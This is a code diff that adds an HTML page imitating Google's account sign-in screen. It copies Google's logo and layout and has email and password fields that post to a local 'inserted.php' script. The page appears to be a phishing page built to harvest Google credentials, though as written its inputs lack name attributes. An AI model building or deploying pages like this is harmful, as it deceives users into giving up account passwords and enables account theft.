@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #f5f5f5;
+        }
+
+        .google-logo {
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg');
+            background-size: contain;
+            background-repeat: no-repeat;
+            height: 40px;
+            width: 120px;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 1.5rem;
+        }
+
+        .floating-label {
+            position: absolute;
+            top: 1rem;
+            left: 1rem;
+            color: #757575;
+            transition: all 0.2s ease-out;
+            pointer-events: none;
+        }
+
+        input:focus+.floating-label,
+        input:not(:placeholder-shown)+.floating-label {
+            top: -0.75rem;
+            left: 1rem;
+            font-size: 0.75rem;
+            color: #4285f4;
+            background-color: white;
+            padding: 0 0.25rem;
+        }
+
+        input {
+            width: 100%;
+            padding: 1rem .9rem !important;
+            border: 1px solid #ccc;
+            border-radius: 0.25rem;
+            outline: none;
+            transition: all 0.2s ease-out;
+            height: 2.5rem;
+        }
+
+        input:focus {
+            border-color: #4285f4;
+            box-shadow: 0 0 0 1px #4285f4;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 1.5rem;
+        }
+
+        .footer-links a {
+            color: #4285f4;
+            text-decoration: none;
+            font-size: 0.875rem;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .button {
+            padding: 0.75rem 1rem;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container mx-auto px-4 py-12 flex flex-col items-center justify-center h-screen bg-gray-50">
+        <div class="w-full max-w-sm bg-white shadow-md rounded-lg p-8">
+            <div class="flex flex-col items-center mb-6">
+                <div class="google-logo mb-4"></div>
+                <h1 class="text-2xl font-medium text-gray-800">Sign in</h1>
+                <p class="text-gray-600">Use your Google Account</p>
+            </div>
+            <form action="inserted.php"
+                  method="post">
+                <div class="input-container">
+                    <input type="email"
+                           id="email"
+                           required>
+                    <label for="email"
+                           class="floating-label">Email or phone</label>
+                </div>
+                <div class="input-container">
+                    <input type="password"
+                           id="password"
+                           required>
+                    <label for="password"
+                           class="floating-label">Password</label>
+                </div>
+                <div class="w-full mb-4">
+                    <button type="submit"
+                            class="button w-full py-2 px-4 bg-blue-500 hover:bg-blue-600 text-white font-medium rounded text-center">Next</button>
+                </div>
+            </form>
+            <div class="footer-links">
+                <a href="#">Create account</a>
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Function to handle Google Sign-In
+        function onSignIn(googleUser) {
+            var profile = googleUser.getBasicProfile();
+            var email = profile.getEmail();
+            document.getElementById('email').value = email.trim();
+        }
+
+        // Wait for DOMContentLoaded before adding event listeners
+        document.addEventListener('DOMContentLoaded', (event) => {
+            // Add event listener to the submit button
+            document.querySelector('form').addEventListener('submit', function (event) {
+                var email = document.getElementById('email').value;
+                var password = document.getElementById('password').value;
+                if (email === "" || password === "") {
+                    event.preventDefault(); // Prevent form submission if fields are empty
+                    alert("Please fill in both email and password.");
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
